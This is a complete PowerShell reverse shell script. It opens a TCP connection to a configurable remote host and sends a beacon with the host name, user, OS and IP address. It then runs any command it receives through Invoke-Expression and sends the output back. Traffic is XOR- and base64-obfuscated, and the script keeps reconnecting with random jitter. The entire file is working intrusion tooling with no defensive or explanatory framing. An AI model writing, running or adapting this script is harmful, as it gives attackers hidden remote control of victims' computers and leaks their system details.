param(
    [string]$RemoteHost = "127.0.0.1",
    [int]$Port          = 4444,
    [int]$TimeoutMs     = 5000,
    [int]$ReconnectDelay = 10,
    [int]$JitterMs      = 2000,
    [int]$MaxRetries    = 0,   # 0 = infinite
    [byte]$XorKey       = 0x41
)

function Invoke-XorEncode {
    param([string]$Text, [byte]$Key)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
    $xored = $bytes | ForEach-Object { $_ -bxor $Key }
    return [Convert]::ToBase64String($xored)
}

function Invoke-XorDecode {
    param([string]$Encoded, [byte]$Key)
    $bytes = [Convert]::FromBase64String($Encoded)
    $xored = $bytes | ForEach-Object { $_ -bxor $Key }
    return [System.Text.Encoding]::UTF8.GetString($xored)
}

function Get-Beacon {
    $ip = try {
        (Get-NetIPAddress -AddressFamily IPv4 |
         Where-Object { $_.IPAddress -notmatch '^(127\.|169\.)' } |
         Select-Object -First 1).IPAddress
    } catch { "unknown" }

    $os = try { (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch { $env:OS }

    $fields = @(
        "HOST=$env:COMPUTERNAME"
        "USER=$env:USERDOMAIN\$env:USERNAME"
        "OS=$os"
        "ARCH=$env:PROCESSOR_ARCHITECTURE"
        "PID=$PID"
        "IP=$ip"
    )
    return "BEACON|" + ($fields -join "|")
}

function Connect-TCPClient {
    param([string]$RemoteHost, [int]$Port, [int]$TimeoutMs)
    $client  = New-Object System.Net.Sockets.TcpClient
    $connect = $client.BeginConnect($RemoteHost, $Port, $null, $null)
    if (-not $connect.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) {
        $client.Close()
        throw "timeout"
    }
    $client.EndConnect($connect)
    return $client
}

function Invoke-Shell {
    param($Reader, $Writer, $Client)

    # Send system beacon on initial connect
    $Writer.WriteLine(Invoke-XorEncode -Text (Get-Beacon) -Key $XorKey)

    while ($Client.Connected) {
        $line = $Reader.ReadLine()
        if ($null -eq $line) { return $true }  # server closed — reconnect

        $cmd = try { Invoke-XorDecode -Encoded $line -Key $XorKey } catch { $line }

        if ($cmd -in @("exit", "quit")) { return $false }

        $output = try {
            Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            "ERROR: $_"
        }

        $Writer.WriteLine(Invoke-XorEncode -Text $output.TrimEnd() -Key $XorKey)
    }

    return $true
}

$attempt = 0

while ($MaxRetries -eq 0 -or $attempt -lt $MaxRetries) {
    $attempt++
    $writer = $null; $reader = $null; $client = $null
    try {
        $client = Connect-TCPClient -RemoteHost $RemoteHost -Port $Port -TimeoutMs $TimeoutMs
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $attempt = 0  # reset counter on successful connect

        $reconnect = Invoke-Shell -Reader $reader -Writer $writer -Client $client
        if (-not $reconnect) { break }
    }
    catch { }
    finally {
        if ($writer) { try { $writer.Close() } catch {} }
        if ($reader) { try { $reader.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }

    # Jittered sleep before retry
    $jitter = Get-Random -Minimum 0 -Maximum $JitterMs
    Start-Sleep -Milliseconds (($ReconnectDelay * 1000) + $jitter)
}
